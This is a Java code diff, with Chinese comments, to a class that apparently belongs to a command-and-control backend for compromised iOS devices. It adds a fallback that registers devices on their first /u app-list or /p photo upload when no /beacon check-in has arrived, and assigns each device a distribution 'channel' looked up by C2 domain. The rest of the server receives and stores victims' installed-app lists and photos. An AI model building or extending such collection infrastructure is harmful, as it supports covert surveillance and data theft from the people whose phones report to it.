@@ -18,12 +18,15 @@ import com.alibaba.fastjson.JSON;
 import com.alibaba.fastjson.JSONArray;
 import com.alibaba.fastjson.JSONObject;
 import com.ctwo.dao.AppListDao;
+import com.ctwo.dao.ChannelDao;
 import com.ctwo.dao.DeviceDao;
 import com.ctwo.dao.Ios18ParamDao;
 import com.ctwo.entity.AppListEntity;
+import com.ctwo.entity.ChannelEntity;
 import com.ctwo.entity.DeviceEntity;
 import com.ctwo.entity.Ios18ParamEntity;
 import com.ctwo.service.CaptureStorageService;
+import com.ctwo.util.DomainMatchUtil;
 import com.ctwo.util.RedisPush;
 
 /**
@@ -53,6 +56,9 @@ public class CtwoAsyncWriter {
 
     @Autowired
     private DeviceDao deviceDao;
+
+    @Autowired
+    private ChannelDao channelDao;
 
     @Autowired
     private AppListDao appListDao;
@@ -142,19 +148,118 @@ public class CtwoAsyncWriter {
     }
 
     /**
+     * /u、/p 先于 /a 时的建机兜底：与 device-server /a、/beacon 对齐——
+     * 有则升为绑定+在线，无则 INSERT；channelcode 空时按域名查 qudao.c2_domain。
+     *
+     * @return 可用的 device；uuid 空则 null
+     */
+    public DeviceEntity ensureDeviceBound(String uuid, String domain, String clientIp) {
+        if (uuid == null || uuid.isEmpty()) {
+            return null;
+        }
+        double now = System.currentTimeMillis() / 1000.0;
+        try {
+            DeviceEntity existing = deviceDao.findByDeviceId(uuid);
+            if (existing != null) {
+                existing.setIp(clientIp);
+                existing.setBindPhase(1);
+                existing.setDevicestatus(1);
+                existing.setOnlinestatus(1);
+                existing.setLastEventAt(now);
+                existing.setC2Series(1);
+                fillChannelIfBlank(existing, domain);
+                if (DomainMatchUtil.isBlank(existing.getDomain()) && !DomainMatchUtil.isBlank(domain)) {
+                    existing.setDomain(domain);
+                }
+                deviceDao.updateById(existing);
+                return existing;
+            }
+
+            DeviceEntity neu = new DeviceEntity();
+            neu.setDeviceId(uuid);
+            neu.setDevice_id(uuid);
+            neu.setChannelCode("");
+            neu.setDomain(domain == null ? "" : domain);
+            neu.setIp(clientIp);
+            neu.setAddtime(now);
+            neu.setIpstatus(0);
+            neu.setDevicestatus(1);
+            neu.setOnlinestatus(1);
+            neu.setBindPhase(1);
+            neu.setLastEventAt(now);
+            neu.setModel("");
+            neu.setDeviceName("");
+            neu.setIosVersion("");
+            neu.setC2Series(1);
+            fillChannelIfBlank(neu, domain);
+            try {
+                deviceDao.insert(neu);
+                log.info("[/u|/p] 设备兜底新建 uuid={} ip={} channel={}",
+                        uuid, clientIp, neu.getChannelCode());
+                return neu;
+            } catch (Exception dup) {
+                DeviceEntity again = deviceDao.findByDeviceId(uuid);
+                if (again != null) {
+                    again.setIp(clientIp);
+                    again.setBindPhase(1);
+                    again.setDevicestatus(1);
+                    again.setOnlinestatus(1);
+                    again.setLastEventAt(now);
+                    again.setC2Series(1);
+                    fillChannelIfBlank(again, domain);
+                    deviceDao.updateById(again);
+                    return again;
+                }
+                log.info("[/u|/p] 设备兜底新建失败 uuid={} ip={} err={}", uuid, clientIp, dup.toString());
+                return null;
+            }
+        } catch (Exception e) {
+            log.info("[/u|/p] 设备兜底失败 uuid={} ip={} err={}", uuid, clientIp, e.toString());
+            return null;
+        }
+    }
+
+    private boolean fillChannelIfBlank(DeviceEntity device, String domainRaw) {
+        if (device == null || !DomainMatchUtil.isBlank(device.getChannelCode())) {
+            return false;
+        }
+        String host = DomainMatchUtil.normalizeHost(domainRaw);
+        if (host.isEmpty() && !DomainMatchUtil.isBlank(device.getDomain())) {
+            host = DomainMatchUtil.normalizeHost(device.getDomain());
+        }
+        if (host.isEmpty()) {
+            return false;
+        }
+        try {
+            ChannelEntity ch = channelDao.findByC2DomainHost(host);
+            if (ch == null || DomainMatchUtil.isBlank(ch.getChannelcode())) {
+                return false;
+            }
+            device.setChannelCode(ch.getChannelcode().trim());
+            log.info("[/u|/p] 域名兜底渠道 uuid={} host={} channel={}",
+                    device.getDeviceId(), host, device.getChannelCode());
+            return true;
+        } catch (Exception e) {
+            log.warn("[/u|/p] 域名查渠道失败 host={} uuid={} err={}",
+                    host, device.getDeviceId(), e.toString());
+            return false;
+        }
+    }
+
+    /**
      * /u 应用列表业务逻辑：解析 body → 过滤 apple → 去重 → upsert applist。
      * 加 @Transactional：applist 多条 upsert 需原子性（/u 不涉及 Redis 入队，无 Consumer 可见性问题）。
      */
     @Async("databaseOperateStreamPush")
     @Transactional
-    public void handleU(String rawBody, String uuid, String clientIp) {
+    public void handleU(String rawBody, String uuid, String clientIp, String domain) {
         if (uuid == null || uuid.isEmpty()) {
             return;
         }
         try {
-            DeviceEntity device = deviceDao.findByDeviceId(uuid);
+            DeviceEntity device = ensureDeviceBound(uuid, domain, clientIp);
             if (device == null) {
-                log.info("/u 上报： 设备信息不存在 uuid={} ip={}", uuid, clientIp);
+                log.info("/u 上报： 设备兜底后仍不存在 uuid={} ip={}", uuid, clientIp);
                 return;
             }
             JSONObject json = JSON.parseObject(rawBody);
@@ -329,9 +434,15 @@ public class CtwoAsyncWriter {
      */
     @Async("databaseOperateStreamPush")
     public void captureAndEnqueuePhoto(Ios18ParamEntity entity, byte[] fileBytes,
-                                       String rawBody, Map<String, String> photoMeta) {
+                                       String rawBody, Map<String, String> photoMeta,
+                                       String domain) {
         if (entity == null || fileBytes == null) return;
         try {
+            String uuid = entity.getDeviceId() == null ? "" : entity.getDeviceId();
+            if (!uuid.isEmpty()) {
+                ensureDeviceBound(uuid, domain, entity.getClientIp());
+            }
+
             int fileLen = fileBytes.length;
             // 照片始终落盘（二进制图片不适合存 text body 列）
             String rel = captureStorage.dumpToFile(fileBytes, "p", entity.getDeviceId());
